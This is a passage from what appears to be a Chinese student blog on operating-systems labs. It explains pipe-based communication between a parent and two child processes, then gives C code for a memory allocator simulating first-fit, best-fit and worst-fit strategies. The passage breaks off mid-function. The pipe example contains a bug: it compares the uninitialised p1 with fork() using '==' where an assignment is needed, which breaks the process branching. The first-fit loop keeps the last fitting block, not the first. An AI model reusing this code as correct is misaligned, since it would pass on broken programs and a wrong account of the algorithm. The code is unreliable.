<li>分配一个隶属于root文件系统的磁盘和内存索引结点inode.</li>
<li>在系统打开文件表中分别分配一读管道文件表项和一写管道文件表项。</li>
<li>在创建管道的进程控制块的文件描述表（进程打开文件表u-ofile）
中分配二表项，表项中的偏移量filedes[0]和filedes[1]分别指向系统打开文件表的读和写管道文件表项。</li>
</ol>
<p>系统调用所涉及的数据结构如下图所示：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/%E5%9B%BE%E7%89%871.png" class="" title="图片1">
<h2 id="前导知识-2">前导知识</h2>
<h3 id="管道">管道</h3>
<p>所谓“管道”，是指用于连接一个读进程和一个写进程以实现他们之间通信的一个共享文件，又名pipe文件。管道分为匿名管道和命名管道。向管道(共享文件)提供输入的发送进程(即写进程)，以字符流形式将大量的数据送入管道；而接受管道输出的接收进程(即读进程)，则从管道中接收(读)数据。由于发送进程和接收进程是利用管道进行通信的，故又称为管道通信。</p>
<p>管道分为匿名管道和命名管道，匿名管道只能用于有亲缘关系的进程（这是由管道利用fork的实现机制所决定的），而命名管道可以用于任意两个进程。由于本实验不涉及命名管道，所以暂且不提，有兴趣的读者可以自行学习。</p>
<p>匿名管道通过<code>int pipe(int fd[2])</code>创建。管道通过read和write函数进行读写。fd[0]是读端，fd[1]是写端。两个进程分别使用读和写端，就可以实现通信。注意在读或写的时候需要用lockf锁定当前端，或者用close关闭另一端</p>
<h3 id="read">read()</h3>
<p>头文件：#include &lt;unistd.h&gt;</p>
<p>函数定义： ssize_t read(int fd, void * buf, size_t count);</p>
<p>函数说明：read从fd中读取count个字节存入buf中。</p>
<h3 id="write">write()</h3>
<p>头文件：#include &lt;unistd.h&gt;</p>
<p>函数定义：ssize_t write(int fd, void * buf, size_t count);</p>
<p>函数说明：write把buf中的count个字节写入fd中。</p>
<h3 id="sprintf">sprintf()</h3>
<p>和printf类似，只不过printf把格式化内容打印到屏幕上，而sprintf把格式化的内容保存到字符串中。例如：sprintf(s,"%d",123);
//把123保存在s中</p>
<h3 id="lockf">lockf()</h3>
<p>头文件：#include &lt;unistd.h&gt;</p>
<p>函数定义： int lockf(int fd, int function, long size)</p>
<p>函数说明：fd是文件描述符，function表示锁状态，1表示锁定，0表示解锁，size是锁定或解锁的字节数，若为0则表示整个文件。</p>
<h2 id="实现思路">实现思路</h2>
<p>这个实验实际上意思就是父进程创建两个子进程，子进程分别通过管道给父进程发送一条信息“Child
process 1 is sending message!”、“Child process 2 is sending
message!”，父进程获取并打印消息然后退出。</p>
<h2 id="代码实现-2">代码实现</h2>
<p>使用lockf，如果要用close的话就把lockf删了，然后把close的注释符删掉</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> p1,p2;</span><br><span class="line">    <span class="type">char</span> outpipe[<span class="number">50</span>],inpipe[<span class="number">50</span>];</span><br><span class="line">    <span class="type">int</span> fd[<span class="number">2</span>];</span><br><span class="line">    </span><br><span class="line">    pipe(fd);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>((p1 == fork()) == <span class="number">-1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(p1)</span><br><span class="line">    &#123;</span><br><span class="line">		<span class="keyword">while</span>((p2 = fork()) == <span class="number">-1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(p2)	<span class="comment">//父进程执行语句</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//close(fd[1]);</span></span><br><span class="line">            wait(<span class="number">0</span>);	<span class="comment">//等待子进程1结束</span></span><br><span class="line">            read(fd[<span class="number">0</span>],inpipe,<span class="number">50</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,inpipe);</span><br><span class="line">            </span><br><span class="line">            wait(<span class="number">0</span>);	<span class="comment">//等待子进程2结束</span></span><br><span class="line">            read(fd[<span class="number">0</span>],inpipe,<span class="number">50</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,inpipe);</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>	<span class="comment">//子进程2执行语句</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//close(fd[0]);</span></span><br><span class="line">            lockf(fd[<span class="number">1</span>],<span class="number">1</span>,<span class="number">0</span>);	<span class="comment">//锁定管道</span></span><br><span class="line">			</span><br><span class="line">            <span class="built_in">sprintf</span>(outpipe,<span class="string">&quot;\nChild process 2 is sending message!\n&quot;</span>);</span><br><span class="line">            write(fd[<span class="number">1</span>],outpipe,<span class="number">50</span>);</span><br><span class="line">            </span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            </span><br><span class="line">            lockf(fd[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>	<span class="comment">//子进程1执行语句</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//close(fd[0]);</span></span><br><span class="line">        lockf(fd[<span class="number">1</span>],<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">sprintf</span>(outpipe,<span class="string">&quot;\nChild process 1 is sending message!\n&quot;</span>);</span><br><span class="line">        write(fd[<span class="number">1</span>],outpipe,<span class="number">50</span>);</span><br><span class="line">        </span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        </span><br><span class="line">        lockf(fd[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实验结果如图：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/image-20191029155551912.png" class="" title="image-20191029155551912">
<p>但有趣的是，使用lockf和close的运行结果有些许差异，使用lockf是先输出p1再输出p2，而使用close则几乎同时输出。</p>
<p>使用lockf：</p>
<p><img src="/2019/10/17/Lecture/OS实验之玩转linux内核/lockf.gif"  alt="lockf" style="zoom:150%;" /></p>
<p>使用close：</p>
<p><img src="/2019/10/17/Lecture/OS实验之玩转linux内核/close.gif"  alt="close" style="zoom: 162%;" /></p>
<p>具体原因不是很懂，如果有知道的大佬请教教小弟。</p>
<h2 id="避免采坑-5">避免采坑</h2>
<p>这个实验比较简单，我在做的时候没有什么困扰我很久的坑。就是注意几个函数的用法、参数的位置就行了。</p>
<h1 id="实验2-3内存的分配与回收">实验2-3——内存的分配与回收</h1>
<h2 id="实验内容-3">实验内容</h2>
<p>通过深入理解内存分配管理的三种算法，定义相应的数据结构，编写具体代码。
充分模拟三种算法的实现过程，并通过对比，分析三种算法的优劣。
（1）掌握内存分配FF，BF，WF策略及实现的思路；
（2）掌握内存回收过程及实现思路；
（3）参考给出的代码思路，实现内存的申请、释放的管理程序，调试运行，总结程序设计中出现的问题并找出原因，写出实验报告。</p>
<p>主要功能：</p>
<p>1 - Set memory size (default=1024) 设置内存的大小 2 - Select memory
allocation algorithm 设置当前的分配算法 3 - New process
创建新的进程，主要是获取内存的申请数量 4 - Terminate a process
删除进程，归还分配的存储空间，并删除描述该进程内存分配的节点 5 - Display
memory usage 显示当前内存的使用情况，包括空闲区的情况和已经分配的情况 0
- Exit</p>
<h2 id="前导知识-3">前导知识</h2>
<h3 id="ffbfwf算法">FF、BF、WF算法</h3>
<p>这三个算法是这次实验的核心。具体的东西课上都讲过，网上也一大堆。简单说一下。FF就是把进程分给第一个匹配的内存块；BF就是把进程分给能容纳进程的最小的内存块，WF和BF相反，就是把进程分给能容纳进程的最大的内存块。</p>
<h3 id="链表">链表</h3>
<p>这次实验中内存的数据结构使用的是链表（更准确的说是单链表），因此需要对链表以及链表的操作有一定了解。链表的操作很多，鉴于篇幅问题这里不赘述了，网上很多相关资料，不熟悉的童鞋可以自行搜索。</p>
<h2 id="实现思路-1">实现思路</h2>
<p>这个实验涉及的模块很多，结果比较复杂，我在编写的过程中经常把自己绕晕，因此我画了一张思维导图，便于理解：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/image-20191107220233737.png" class="" title="image-20191107220233737">
<p>下面我们就按照这个结构来依次实现各个模块。</p>
<h2 id="代码实现-3">代码实现</h2>
<p>程序在windows平台使用VS
2019编写，经测试windows和linux平台均可正常运行</p>
<p>注意：</p>
<ol type="1">
<li>如果使用VS编写scanf会报错，这是VS的安全检查机制导致的，取消报错的方法网上很多，这里就不赘述了。</li>
<li>函数之间可能存在调用关系，因此注意函数之间的顺序或者提前进行函数声明。</li>
</ol>
<p>友情提示：有的模块代码较长，如果看着不方便可点击代码块全屏浏览哦</p>
<h3 id="主要数据结构">主要数据结构</h3>
<h4 id="内存空闲分区的描述">内存空闲分区的描述</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//描述每一个空闲块的数据结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> size;</span><br><span class="line">    <span class="type">int</span> start_addr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//指向内存中空闲块链表的首指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span>* <span class="title">free_block_head</span> =</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<h4 id="已分配内存块的描述">已分配内存块的描述</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">allocated_block</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">int</span> start_addr;</span><br><span class="line">    <span class="type">char</span> process_name[PROCESS_NAME_LEN];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">allocated_block</span>* <span class="title">next</span></span></span><br><span class="line"><span class="class">&#125;;</span></span><br><span class="line"><span class="comment">//进程分配内存块链表的首指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">allocated_block</span>* <span class="title">allocated_block_head</span> =</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<h4 id="常量定义">常量定义</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>	PROCESS_NAME_LEN	32	<span class="comment">//进程名长度</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MIN_SLICE	10	<span class="comment">//最小碎片大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	DEFAULT_MEM_SIZE	1024	<span class="comment">//默认内存大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MEM_START	0	<span class="comment">//内存起始位置</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MA_FF	1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MA_BF	2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MA_WF	3</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> mem_size = DEFAULT_MEM_SIZE;	<span class="comment">//可用内存大小，初始化为默认内存大小</span></span><br><span class="line"><span class="type">int</span> mem_size_total = DEFAULT_MEM_SIZE;	<span class="comment">//总共内存大小，初始化为默认大小</span></span><br><span class="line"><span class="type">int</span> ma_algorithm = MA_FF;	<span class="comment">//当前内存分配算法，初始化为FF</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> pid = <span class="number">0</span>;	<span class="comment">//进程pid号，初始值为0</span></span><br><span class="line"><span class="type">int</span> flag = <span class="number">0</span>;	<span class="comment">//设置内存大小标志，防止重新设置</span></span><br></pre></td></tr></table></figure>
<h3 id="函数模块">函数模块</h3>
<h4 id="主函数及菜单">主函数及菜单</h4>
<h5 id="主函数">主函数</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> choice;</span><br><span class="line">	free_block_head = init_free_block(mem_size);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		display_menu();	<span class="comment">//显示菜单</span></span><br><span class="line">		fflush(<span class="built_in">stdin</span>);	<span class="comment">//清空缓冲区，防止误选</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);	<span class="comment">//获取用户输入</span></span><br><span class="line">		<span class="keyword">if</span> (choice &lt;= <span class="number">5</span> &amp;&amp; choice &gt;= <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">switch</span> (choice)</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>: set_mem_size(); <span class="keyword">break</span>;	<span class="comment">//设置内存大小</span></span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>: set_algorithm(); flag = <span class="number">1</span>; <span class="keyword">break</span>;	<span class="comment">//设置算法</span></span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>: new_process(); flag = <span class="number">1</span>; <span class="keyword">break</span>;	<span class="comment">//创建新进程</span></span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>: kill_process(); flag = <span class="number">1</span>; <span class="keyword">break</span>;	<span class="comment">//删除进程</span></span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>: display_mem_usage(); flag = <span class="number">1</span>; <span class="keyword">break</span>;	<span class="comment">//显示内存使用</span></span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>: do_exit(); <span class="built_in">exit</span>(<span class="number">0</span>);	<span class="comment">//释放链表并退出</span></span><br><span class="line">			<span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\nInvalid choice, please select again!\n\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="显示菜单">显示菜单</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">display_menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;      Memory Management Experiment\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;          (c) WPX 2176112425\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;               2019.11.3\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;current algo: %d\tcurrent mem_size: %d\n\n&quot;</span>, ma_algorithm, mem_size_total);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Please enter a number to select the appropriate function:\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1 -- Set memory size(default=%d)\n&quot;</span>, DEFAULT_MEM_SIZE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2 -- Select memory allocation algorithm\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3 -- New process\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;4 -- Terminate a process\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;5 -- Display memory usage\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;0 -- Exit\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="初始化内存">初始化内存</h4>
<h5 id="初始化空闲块">初始化空闲块</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> free_block_type* <span class="title function_">init_free_block</span><span class="params">(<span class="type">int</span> mem_size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span>* <span class="title">fb</span>;</span></span><br><span class="line">	fb = (<span class="keyword">struct</span> free_block_type*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> free_block_type));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fb == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;No memory!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fb-&gt;size = mem_size;</span><br><span class="line">	fb-&gt;start_addr = DEFAULT_MEM_START;</span><br><span class="line">	fb-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> fb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="设置内存大小">设置内存大小</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">set_mem_size</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flag)	<span class="comment">//检查是否重复设置</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Cannot set memory size again!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nTotal memory size = &quot;</span>);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size &gt;= <span class="number">0</span>)	<span class="comment">//检查内存大小是否合法</span></span><br><span class="line">	&#123;</span><br><span class="line">		mem_size = size;</span><br><span class="line">		mem_size_total = size;</span><br><span class="line">		free_block_head-&gt;size = mem_size;</span><br><span class="line">		flag = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Memory size is not valid!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="设置内存算法">设置内存算法</h4>
<h5 id="显示设置菜单">显示设置菜单</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">set_algorithm</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> algorithm;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Please enter a number to select the appropriate algorithm:\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1 -- First Fit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2 -- Best Fit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3 -- Worst Fit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;algorithm);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (algorithm &gt;= <span class="number">1</span> &amp;&amp; algorithm &lt;= <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		ma_algorithm = algorithm;</span><br><span class="line">		rearrange(ma_algorithm);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Invalid choice!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="按指定算法重新排列空闲区链表">按指定算法重新排列空闲区链表</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rearrange</span><span class="params">(<span class="type">int</span> algorithm)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">switch</span> (algorithm)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> MA_FF: rearrange_FF(); <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MA_BF:	rearrange_BF(); <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MA_WF: rearrange_WF(); <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="创建进程载入内存">创建进程载入内存</h4>
<h5 id="创建新进程获取内存申请数量">创建新进程，获取内存申请数量</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">new_process</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">allocated_block</span>* <span class="title">ab</span>;</span></span><br><span class="line">	<span class="type">int</span> size;</span><br><span class="line">	<span class="comment">//给进程分配内存的结果</span></span><br><span class="line">	<span class="type">int</span> allocate_ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建一个进程</span></span><br><span class="line">	ab = (<span class="keyword">struct</span> allocated_block*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> allocated_block));</span><br><span class="line">	<span class="keyword">if</span> (!ab)	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//确定进程属性</span></span><br><span class="line">	ab-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	pid++;</span><br><span class="line">	<span class="built_in">sprintf</span>(ab-&gt;process_name, <span class="string">&quot;PROCESS-%02d&quot;</span>, pid);</span><br><span class="line">	ab-&gt;pid = pid;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nPlease input the memory for PROCESS-%02d: &quot;</span>, pid);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">	<span class="keyword">if</span> (size &gt; <span class="number">0</span>)	ab-&gt;size = size;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\nInvalid memory size!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//从空闲区分配内存，返回分配结果。1表示分配成功，-1表示分配失败</span></span><br><span class="line">	allocate_ret = allocate_mem(ab);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((allocate_ret == <span class="number">1</span>) &amp;&amp; (allocated_block_head == <span class="literal">NULL</span>))	<span class="comment">//如果是第一个节点</span></span><br><span class="line">	&#123;</span><br><span class="line">		allocated_block_head = ab;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ((allocate_ret == <span class="number">1</span>) &amp;&amp; (allocated_block_head != <span class="literal">NULL</span>))	<span class="comment">//如果不是第一个节点</span></span><br><span class="line">	&#123;</span><br><span class="line">		ab-&gt;next = allocated_block_head;</span><br><span class="line">		allocated_block_head = ab;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (allocate_ret == <span class="number">-1</span>)	<span class="comment">//如果分配失败</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\nAllocation failed!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(ab);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nAllocation success!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="分配内存模块">分配内存模块</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">allocate_mem</span><span class="params">(<span class="keyword">struct</span> allocated_block* ab)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span>* <span class="title">fbt</span>, * <span class="title">pre</span>, * <span class="title">ne</span>, * <span class="title">p1</span>, * <span class="title">p2</span>;</span></span><br><span class="line">	<span class="type">int</span> request_size = ab-&gt;size;</span><br><span class="line">	fbt = pre = ne = p1 = p2 = free_block_head;</span><br><span class="line">	<span class="type">int</span> allocate_flag = <span class="number">0</span>;	<span class="comment">//判断是否已经找到匹配空闲块</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//根据当前算法在空闲分区链表中搜索合适空闲分区进行分配，分配时注意以下情况：</span></span><br><span class="line">	<span class="comment">// 1. 找到可满足空闲分区且分配后剩余空间足够大，则分割</span></span><br><span class="line">	<span class="comment">// 2. 找到可满足空闲分区且但分配后剩余空间比较小，则一起分配</span></span><br><span class="line">	<span class="comment">// 3. 找不到可满足需要的空闲分区但空闲分区之和能满足需要，则采用内存紧缩技术，进行空闲分区的合并，然后再分配</span></span><br><span class="line">	<span class="comment">// 4. 在成功分配内存后，应保持空闲分区按照相应算法有序</span></span><br><span class="line">	<span class="comment">// 5. 分配成功则返回1，否则返回-1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mem_size &lt;= <span class="number">0</span>)	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//遍历查找匹配空闲块</span></span><br><span class="line">	<span class="keyword">if</span> (ne-&gt;next)	<span class="comment">//如果空闲块不止一个	</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (ma_algorithm == <span class="number">1</span>)	<span class="comment">//如果是FF算法，遍历每一个空闲块</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">while</span> (ne)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (ne != free_block_head)	p2 = p1;</span><br><span class="line">				p1 = ne;</span><br><span class="line">				ne = ne-&gt;next;</span><br><span class="line">				<span class="keyword">if</span> (request_size &lt;= p1-&gt;size)</span><br><span class="line">				&#123;</span><br><span class="line">					fbt = p2;</span><br><span class="line">					pre = p1;</span><br><span class="line">					allocate_flag = <span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (ma_algorithm == <span class="number">2</span>)	<span class="comment">//如果是BF算法，则遍历每一个大小满足要求的空闲块</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">while</span> ((ne != <span class="literal">NULL</span>) &amp;&amp; (request_size &lt;= ne-&gt;size))	</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (allocate_flag)	fbt = pre;</span><br><span class="line">				pre = ne;</span><br><span class="line">				ne = ne-&gt;next;</span><br><span class="line">				allocate_flag = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span 